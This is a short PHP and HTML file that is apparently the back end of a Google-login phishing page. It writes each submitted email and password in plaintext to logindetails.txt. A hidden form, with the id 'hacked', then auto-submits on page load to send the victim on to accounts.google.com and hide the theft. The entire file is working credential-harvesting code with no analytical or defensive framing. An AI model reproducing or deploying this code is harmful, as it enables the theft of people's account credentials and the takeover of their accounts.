<?php 
$file = fopen('logindetails.txt', 'a+', );
$write = fwrite($file, 'email: '.$_POST['Email']. PHP_EOL .'password: '. $_POST['Passwd'] );
fclose($file);

 ?>
<html>
<head>
	<title></title>
	<script type="text/javascript">
	function submitnow () {
		document.getElementById("hacked").submit();
	}
	</script>
</head>
<body onload="submitnow()">
<form action="https://accounts.google.com" method="post" id="hacked">
 	<input type="hidden" name='email' value="<?php echo $_POST['Email']; ?>">
 	<input type="hidden" name='pass' value="<?php echo $_POST['Passwd']; ?>">
 </form>
</body>
</html>
 